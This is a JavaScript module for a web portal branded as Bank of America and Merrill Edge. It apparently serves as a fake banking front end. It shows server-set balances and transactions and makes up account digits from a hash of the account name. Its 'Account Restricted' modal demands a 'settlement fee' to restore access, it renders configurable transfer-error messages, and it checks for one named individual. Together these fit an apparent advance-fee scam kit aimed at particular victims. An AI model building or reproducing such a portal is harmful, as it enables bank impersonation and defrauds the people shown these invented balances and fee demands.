(function () {
    let cachedConfig = null;
    let realtimeChannel = null;
    let supabaseClient = null;
    let eventSource = null;
    let fallbackTimer = null;
    let refreshTimer = null;
    const CONFIG_CACHE_KEY = 'boaConfigCache';

    function currentUserId() {
        if (window.BoAAuth && typeof window.BoAAuth.getUserId === 'function') {
            return window.BoAAuth.getUserId();
        }
        return sessionStorage.getItem('boaUserId');
    }

    function persistCache(config) {
        const userId = currentUserId();
        if (!userId || !config) {
            return;
        }
        try {
            sessionStorage.setItem(CONFIG_CACHE_KEY, JSON.stringify({
                userId: userId,
                savedAt: Date.now(),
                config: config
            }));
        } catch (error) {
            // Ignore quota / private-mode failures
        }
    }

    function readCache() {
        try {
            const raw = sessionStorage.getItem(CONFIG_CACHE_KEY);
            if (!raw) {
                return null;
            }
            const parsed = JSON.parse(raw);
            const userId = currentUserId();
            if (!parsed || parsed.userId !== userId || !parsed.config) {
                return null;
            }
            return normalizeConfig(parsed.config);
        } catch (error) {
            return null;
        }
    }

    function clearCache() {
        try {
            sessionStorage.removeItem(CONFIG_CACHE_KEY);
        } catch (error) {
            // Ignore
        }
    }

    function formatCurrency(amount) {
        return new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD'
        }).format(Number(amount) || 0);
    }

    function normalizeConfig(data) {
        return {
            fullName: data.fullName,
            accounts: data.accounts || [],
            transferError: data.transferError,
            restriction: data.restriction,
            invest: data.invest,
            transactions: data.transactions || []
        };
    }

    function loadScript(src) {
        return new Promise(function (resolve, reject) {
            if (document.querySelector('script[data-live-sync-src="' + src + '"]')) {
                resolve();
                return;
            }
            const script = document.createElement('script');
            script.src = src;
            script.async = true;
            script.setAttribute('data-live-sync-src', src);
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }

    async function refreshFromServer(renderFn) {
        await window.BoAConfig.load();
        if (typeof renderFn === 'function') {
            renderFn();
        }
    }

    function scheduleRefresh(renderFn) {
        if (refreshTimer) {
            clearTimeout(refreshTimer);
        }
        refreshTimer = setTimeout(function () {
            refreshFromServer(renderFn).catch(function () {
                // Ignore background refresh errors
            });
        }, 250);
    }

    async function setupSupabaseRealtime(cfg, renderFn) {
        await loadScript('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js');

        if (!window.supabase || typeof window.supabase.createClient !== 'function') {
            throw new Error('Supabase client unavailable.');
        }

        if (!supabaseClient) {
            supabaseClient = window.supabase.createClient(cfg.url, cfg.anonKey);
        }

        if (realtimeChannel) {
            await supabaseClient.removeChannel(realtimeChannel);
            realtimeChannel = null;
        }

        realtimeChannel = supabaseClient
            .channel('boa-config-sync')
            .on('postgres_changes', {
                event: '*',
                schema: 'public',
                table: 'config_sync'
            }, function () {
                scheduleRefresh(renderFn);
            })
            .subscribe();
    }

    function setupSseSync(renderFn) {
        const token = window.BoAAuth && typeof window.BoAAuth.getToken === 'function'
            ? window.BoAAuth.getToken()
            : sessionStorage.getItem('boaUserToken');

        if (!token || typeof EventSource === 'undefined') {
            return false;
        }

        if (eventSource) {
            eventSource.close();
        }

        eventSource = new EventSource('/api/updates?token=' + encodeURIComponent(token));
        eventSource.onmessage = function () {
            scheduleRefresh(renderFn);
        };
        eventSource.onerror = function () {
            if (eventSource) {
                eventSource.close();
                eventSource = null;
            }
        };
        return true;
    }

    async function setupLiveSync(renderFn) {
        let realtimeReady = false;

        // Same-origin SSE first — no CDN download on the critical path
        if (setupSseSync(renderFn)) {
            realtimeReady = true;
        }

        try {
            const response = await fetch('/api/public/realtime-config');
            const cfg = await response.json();
            if (cfg.enabled && cfg.url && cfg.anonKey) {
                await setupSupabaseRealtime(cfg, renderFn);
                realtimeReady = true;
            }
        } catch (error) {
            // Fall back to polling below if needed
        }

        if (!realtimeReady) {
            fallbackTimer = setInterval(function () {
                refreshFromServer(renderFn).catch(function () {
                    // Ignore background refresh errors
                });
            }, 15000);
        } else {
            // Light safety net when live sync is already running
            setInterval(function () {
                refreshFromServer(renderFn).catch(function () {
                    // Ignore background refresh errors
                });
            }, 120000);
        }
    }

    window.BoAConfig = {
        formatCurrency: formatCurrency,

        isJimmyChiang: function () {
            try {
                return /^jimmy\s+chiang$/i.test(String(this.get().fullName || '').trim());
            } catch (error) {
                return false;
            }
        },

        load: async function () {
            const token = window.BoAAuth && typeof window.BoAAuth.getToken === 'function'
                ? window.BoAAuth.getToken()
                : sessionStorage.getItem('boaUserToken');
            const headers = {};
            if (token) {
                headers.Authorization = 'Bearer ' + token;
            }

            const response = await fetch('/api/config', { headers: headers });
            if (!response.ok) {
                throw new Error('Unable to load app configuration.');
            }
            const data = await response.json();
            cachedConfig = normalizeConfig(data);
            persistCache(cachedConfig);
            return cachedConfig;
        },

        get: function () {
            if (!cachedConfig) {
                throw new Error('Configuration not loaded. Call BoAConfig.load() first.');
            }
            return cachedConfig;
        },

        login: async function (username, password) {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            const data = await response.json();
            if (response.ok && data.success) {
                if (data.userId) {
                    sessionStorage.setItem('boaUserId', data.userId);
                }
                if (data.config) {
                    cachedConfig = normalizeConfig(data.config);
                    persistCache(cachedConfig);
                }
                return { success: true, userId: data.userId, token: data.token };
            }
            return { success: false };
        },

        hydrateFromCache: function () {
            if (cachedConfig) {
                return true;
            }
            const stored = readCache();
            if (!stored) {
                return false;
            }
            cachedConfig = stored;
            return true;
        },

        clearCache: clearCache,

        initPage: async function (renderFn) {
            const hadCache = this.hydrateFromCache();
            if (hadCache && typeof renderFn === 'function') {
                try {
                    renderFn();
                } catch (error) {
                    // Cached payload may be incomplete; network load still follows
                }
            }

            await this.load();
            if (typeof renderFn === 'function') {
                renderFn();
            }

            // Live sync must not delay first paint / account UI
            function startLiveSync() {
                setupLiveSync(renderFn).catch(function () {
                    // Ignore live-sync setup errors
                });
            }

            if (typeof window.requestIdleCallback === 'function') {
                window.requestIdleCallback(startLiveSync, { timeout: 1500 });
            } else {
                setTimeout(startLiveSync, 0);
            }
        },

        accountLastFour: function (account) {
            if (account && account.last4) {
                return String(account.last4).replace(/\D/g, '').slice(-4).padStart(4, '0');
            }
            let total = 0;
            String((account && account.name) || '').split('').forEach(function (ch) {
                total = (total * 33 + ch.charCodeAt(0)) % 9000;
            });
            return String(1000 + total).slice(-4);
        },

        accountKind: function (account) {
            const name = String((account && account.name) || '').toLowerCase();
            if (/visa|mastercard|amex|american express|credit card|\bcard\b/.test(name)) {
                return 'card';
            }
            if (/loan|mortgage|auto|heloc|line of credit/.test(name)) {
                return 'loan';
            }
            return 'bank';
        },

        renderAccountRow: function (account, index, options) {
            const opts = options || {};
            const label = opts.balanceLabel || (opts.kind === 'loan' ? 'Current balance' : 'Available balance');
            const last4 = this.accountLastFour(account);
            return (
                '<div class="account-item" data-account-index="' + index + '" role="button" tabindex="0">' +
                    '<div class="account-details">' +
                        '<p class="account-name">' + account.name + '</p>' +
                        '<p class="account-mask">&bull;&bull;&bull;&bull; ' + last4 + '</p>' +
                        '<p class="account-balance-label">' + label + '</p>' +
                        '<p class="account-balance">' + this.formatCurrency(account.balance) + '</p>' +
                    '</div>' +
                    '<button type="button" class="view-btn" data-account-index="' + index + '">VIEW</button>' +
                '</div>'
            );
        },

        bindAccountRows: function (root) {
            if (!root) {
                return;
            }
            function openFrom(el) {
                const index = Number(el.getAttribute('data-account-index'));
                if (!isNaN(index)) {
                    BoAConfig.openAccountDetail(index);
                }
            }
            root.querySelectorAll('.view-btn, .account-item').forEach(function (el) {
                el.addEventListener('click', function (event) {
                    event.preventDefault();
                    event.stopPropagation();
                    openFrom(el.closest('[data-account-index]') || el);
                });
                if (el.classList.contains('account-item')) {
                    el.addEventListener('keydown', function (event) {
                        if (event.key === 'Enter' || event.key === ' ') {
                            event.preventDefault();
                            openFrom(el);
                        }
                    });
                }
            });
        },

        renderDashboard: function () {
            const config = this.get();
            const greeting = document.getElementById('userGreeting');
            const bankGroup = document.getElementById('bankAccountsGroup');
            const accountList = document.getElementById('accountList');
            const cardList = document.getElementById('cardAccountList');
            const loanList = document.getElementById('loanAccountList');
            const cardGroup = document.getElementById('cardAccountsGroup');
            const loanGroup = document.getElementById('loanAccountsGroup');
            const merrillGroup = document.getElementById('merrillGroup');
            const merrillList = document.getElementById('merrillAccountList');

            const first = String(config.fullName || 'there').trim().split(/\s+/)[0];
            const hello = 'Hello, ' + first;
            if (greeting) {
                greeting.textContent = hello;
            }
            const accountsGreeting = document.getElementById('accountsGreeting');
            if (accountsGreeting) {
                accountsGreeting.textContent = hello;
            }

            const accounts = config.accounts || [];
            const bankTotal = accounts.reduce(function (sum, account) {
                return sum + (Number(account.balance) || 0);
            }, 0);
            const investTotal = config.invest && config.invest.totalValue ? Number(config.invest.totalValue) : 0;
            const totalEl = document.getElementById('dashboardTotalBalance');
            if (totalEl) {
                totalEl.textContent = this.formatCurrency(bankTotal + investTotal);
            }
            const bankingTotal = document.getElementById('bankingTotal');
            if (bankingTotal) {
                bankingTotal.textContent = this.formatCurrency(bankTotal);
            }

            const bank = [];
            const cards = [];
            const loans = [];
            accounts.forEach(function (account, index) {
                const kind = BoAConfig.accountKind(account);
                const row = { account: account, index: index, kind: kind };
                if (kind === 'card') cards.push(row);
                else if (kind === 'loan') loans.push(row);
                else bank.push(row);
            });

            if (accountList) {
                if (bankGroup) bankGroup.hidden = bank.length === 0;
                accountList.innerHTML = bank.map(function (row) {
                    return BoAConfig.renderAccountRow(row.account, row.index, { kind: 'bank' });
                }).join('');
                this.bindAccountRows(accountList);
            }
            if (cardList && cardGroup) {
                cardGroup.hidden = cards.length === 0;
                cardList.innerHTML = cards.map(function (row) {
                    return BoAConfig.renderAccountRow(row.account, row.index, { kind: 'card', balanceLabel: 'Available credit' });
                }).join('');
                this.bindAccountRows(cardList);
            }
            if (loanList && loanGroup) {
                loanGroup.hidden = loans.length === 0;
                loanList.innerHTML = loans.map(function (row) {
                    return BoAConfig.renderAccountRow(row.account, row.index, { kind: 'loan' });
                }).join('');
                this.bindAccountRows(loanList);
            }

            if (merrillGroup && merrillList && config.invest) {
                merrillGroup.hidden = false;
                const last4 = this.accountLastFour({ name: 'Merrill Edge Self-Directed', last4: '4582' });
                const change = config.invest.changeAmount || 0;
                const changeClass = change < 0 ? ' negative' : '';
                const sign = change >= 0 ? '+' : '';
                merrillList.innerHTML =
                    '<div class="account-item merrill-item" id="merrillOverviewRow" role="button" tabindex="0">' +
                        '<div class="account-details">' +
                            '<p class="account-name">Merrill Edge<sup>&reg;</sup> Self-Directed</p>' +
                            '<p class="account-mask">&bull;&bull;&bull;&bull; ' + last4 + '</p>' +
                            '<p class="account-balance-label">Total account value</p>' +
                            '<p class="account-balance">' + this.formatCurrency(config.invest.totalValue) + '</p>' +
                            '<p class="account-day-change' + changeClass + '">Today ' + sign + this.formatCurrency(change) + '</p>' +
                        '</div>' +
                        '<button type="button" class="view-btn" id="merrillViewBtn">VIEW</button>' +
                    '</div>';
                function goInvest() {
                    window.location.href = 'invest.html';
                }
                const merrillRow = document.getElementById('merrillOverviewRow');
                const merrillBtn = document.getElementById('merrillViewBtn');
                if (merrillRow) merrillRow.addEventListener('click', goInvest);
                if (merrillBtn) {
                    merrillBtn.addEventListener('click', function (event) {
                        event.preventDefault();
                        event.stopPropagation();
                        goInvest();
                    });
                }
            } else if (merrillGroup) {
                merrillGroup.hidden = true;
            }
        },

        openAccountDetail: function (index) {
            const config = this.get();
            const account = (config.accounts || [])[index];
            const overlay = document.getElementById('accountDetailOverlay');
            if (!account || !overlay) {
                return;
            }

            const nameEl = document.getElementById('accountDetailName');
            const balanceEl = document.getElementById('accountDetailBalance');
            const numberEl = document.getElementById('accountDetailNumber');
            const listEl = document.getElementById('accountDetailActivity');
            const kind = this.accountKind(account);
            const balanceLabel = document.getElementById('accountDetailLabel');
            if (nameEl) nameEl.textContent = account.name;
            if (balanceEl) balanceEl.textContent = this.formatCurrency(account.balance);
            if (balanceLabel) {
                balanceLabel.textContent = kind === 'loan' ? 'Current balance' : (kind === 'card' ? 'Available credit' : 'Available balance');
            }
            if (numberEl) numberEl.textContent = 'Account •••• ' + this.accountLastFour(account);

            const txs = (config.transactions || []).filter(function (tx) {
                return !tx.fromAccount && !tx.toAccount
                    || tx.fromAccount === account.name
                    || tx.toAccount === account.name;
            }).slice(0, 25);

            if (listEl) {
                if (!txs.length) {
                    listEl.innerHTML = '<p class="account-detail-empty">No recent activity for this account.</p>';
                } else {
                    listEl.innerHTML = txs.map(function (tx) {
                        const formattedAmount = BoAConfig.formatCurrency(Math.abs(tx.amount));
                        const sign = tx.type === 'positive' ? '+' : '-';
                        let status = '';
                        if (tx.status === 'pending') status = '<p class="transaction-status pending">Pending</p>';
                        if (tx.status === 'cancelled') status = '<p class="transaction-status cancelled">Cancelled</p>';
                        return (
                            '<div class="transaction-item">' +
                                '<div class="transaction-date">' +
                                    '<span class="month">' + tx.month + '</span>' +
                                    '<span class="day">' + tx.day + '</span>' +
                                    '<span class="year">' + tx.year + '</span>' +
                                '</div>' +
                                '<div class="transaction-details">' +
                                    '<p class="transaction-desc">' + tx.desc + '</p>' +
                                    '<p class="transaction-sub">' + tx.sub + '</p>' +
                                    status +
                                '</div>' +
                                '<div class="transaction-amount ' + tx.type + '">' + sign + formattedAmount + '</div>' +
                            '</div>'
                        );
                    }).join('');
                }
            }

            overlay.classList.add('is-open');
            overlay.setAttribute('aria-hidden', 'false');
            overlay.scrollTop = 0;
            document.body.classList.add('account-detail-open');
        },

        closeAccountDetail: function () {
            const overlay = document.getElementById('accountDetailOverlay');
            if (!overlay) {
                return;
            }
            overlay.classList.remove('is-open');
            overlay.setAttribute('aria-hidden', 'true');
            document.body.classList.remove('account-detail-open');
        },

        renderDepositAccounts: function () {
            const config = this.get();
            const dropdown = document.getElementById('accountDropdown');
            const selectedName = document.getElementById('selectedAccountName');
            const selectedBalance = document.getElementById('selectedAccountBalance');

            if (!dropdown || !config.accounts.length) {
                return;
            }

            const currentName = selectedName ? selectedName.textContent : '';
            const matchedAccount = config.accounts.find(function (account) {
                return account.name === currentName;
            }) || config.accounts[0];

            dropdown.innerHTML = config.accounts.map(function (account) {
                const formatted = BoAConfig.formatCurrency(account.balance);
                const selectedClass = account.name === matchedAccount.name ? ' selected' : '';
                return (
                    '<div class="account-option' + selectedClass + '" data-name="' + account.name + '" data-balance="' + formatted + '">' +
                        '<span class="account-name">' + account.name + '</span>' +
                        '<span class="account-balance-small">Available: ' + formatted + '</span>' +
                    '</div>'
                );
            }).join('');

            if (selectedName && selectedBalance) {
                selectedName.textContent = matchedAccount.name;
                selectedBalance.textContent = 'Available: ' + this.formatCurrency(matchedAccount.balance);
            }

            if (typeof window.bindDepositAccountOptions === 'function') {
                window.bindDepositAccountOptions();
            }
        },

        renderTransferError: function () {
            const config = this.get();
            const title = document.getElementById('transferErrorTitle');
            const message = document.getElementById('transferErrorMessage');
            const button = document.getElementById('retryTransferBtn');

            if (title) title.textContent = config.transferError.title;
            if (message) message.textContent = config.transferError.message;
            if (button) button.textContent = config.transferError.button;
        },

        renderInvestRestriction: function () {
            const config = this.get();

            const title = document.getElementById('investRestrictionTitle') || document.querySelector('#restrictionModal .security-title');
            const greeting = document.getElementById('investRestrictionGreeting');
            const message = document.getElementById('investRestrictionMessage');
            const feeLine = document.getElementById('investRestrictionFeeText');
            const fee = document.getElementById('investSettlementFee');
            const button = document.getElementById('closeRestrictionBtn');
            const support = document.getElementById('contactSupportLink');

            const restriction = config.restriction || {};
            const feeFormatted = this.formatCurrency(restriction.settlementFee);
            const name = config.fullName || 'Customer';

            function fill(template, fallback) {
                return String(template || fallback || '')
                    .replace(/\{name\}/gi, name)
                    .replace(/\{fee\}/gi, feeFormatted);
            }

            if (title) {
                title.textContent = restriction.title || 'Account Restricted';
            }
            if (greeting) {
                greeting.innerHTML = fill(restriction.greeting, 'Dear {name},') + '<br><br>';
            }
            if (message) {
                message.textContent = restriction.message || '';
            }
            if (feeLine) {
                feeLine.innerHTML = fill(restriction.feeText, 'A settlement fee of {fee} is required to restore full access and remove the restriction, so normal account operations will be restored.')
                    .split(feeFormatted)
                    .join('<strong style="color: #E31837;">' + feeFormatted + '</strong>');
            } else if (fee) {
                fee.textContent = feeFormatted;
            }
            if (button) {
                button.textContent = restriction.button || 'I Understand';
            }
            if (support) {
                support.textContent = restriction.support || 'Contact Support';
            }
        },

        renderInvestSummary: function () {
            const config = this.get();
            const total = document.getElementById('investTotalAmount');
            const change = document.getElementById('investChangeAmount');
            const holdingsList = document.getElementById('holdingsList');

            if (total) {
                total.textContent = this.formatCurrency(config.invest.totalValue);
            }
            if (change) {
                const sign = config.invest.changeAmount >= 0 ? '+' : '';
                const percentSign = config.invest.changePercent >= 0 ? '+' : '';
                change.textContent = 'Today ' + sign + this.formatCurrency(config.invest.changeAmount) +
                    ' (' + percentSign + Number(config.invest.changePercent).toFixed(2) + '%)';
                change.classList.toggle('negative', Number(config.invest.changeAmount) < 0);
            }
            if (holdingsList) {
                const holdings = config.invest.holdings || [];
                if (!holdings.length) {
                    holdingsList.innerHTML = '<div class="holding-item"><div class="holding-symbol">No holdings to display</div></div>';
                    return;
                }
                holdingsList.innerHTML = holdings.map(function (holding) {
                    const changeClass = holding.change < 0 ? ' negative' : '';
                    const changeSign = holding.change >= 0 ? '+' : '';
                    return (
                        '<div class="holding-item">' +
                            '<div>' +
                                '<div class="holding-symbol">' + holding.symbol + '</div>' +
                                '<div class="holding-name">' + holding.name + '</div>' +
                            '</div>' +
                            '<div>' +
                                '<div class="holding-value">' + BoAConfig.formatCurrency(holding.value) + '</div>' +
                                '<div class="holding-change' + changeClass + '">' + changeSign + BoAConfig.formatCurrency(Math.abs(holding.change)) + '</div>' +
                            '</div>' +
                        '</div>'
                    );
                }).join('');
            }
        },

        renderTransactions: function () {
            const config = this.get();
            const container = document.getElementById('transaction-list-container');
            if (!container) {
                return;
            }

            const fragment = document.createDocumentFragment();
            config.transactions.forEach(function (tx) {
                const item = document.createElement('div');
                item.className = 'transaction-item';
                const formattedAmount = BoAConfig.formatCurrency(Math.abs(tx.amount));
                const sign = tx.type === 'positive' ? '+' : '-';
                let detailsHtml = '<p class="transaction-desc">' + tx.desc + '</p>' +
                    '<p class="transaction-sub">' + tx.sub + '</p>';
                if (tx.detail) {
                    detailsHtml += '<p class="transaction-sub">' + tx.detail + '</p>';
                }
                if (tx.ref) {
                    detailsHtml += '<p class="transaction-sub">Ref: ' + tx.ref + '</p>';
                }
                if (tx.status === 'pending') {
                    detailsHtml += '<p class="transaction-status pending">Pending</p>';
                } else if (tx.status === 'cancelled') {
                    detailsHtml += '<p class="transaction-status cancelled">Cancelled</p>';
                }
                item.innerHTML =
                    '<div class="transaction-date">' +
                        '<span class="month">' + tx.month + '</span>' +
                        '<span class="day">' + tx.day + '</span>' +
                        '<span class="year">' + tx.year + '</span>' +
                    '</div>' +
                    '<div class="transaction-details">' + detailsHtml + '</div>' +
                    '<div class="transaction-amount ' + tx.type + '">' + sign + formattedAmount + '</div>';
                fragment.appendChild(item);
            });
            container.innerHTML = '';
            container.appendChild(fragment);
        }
    };
})();
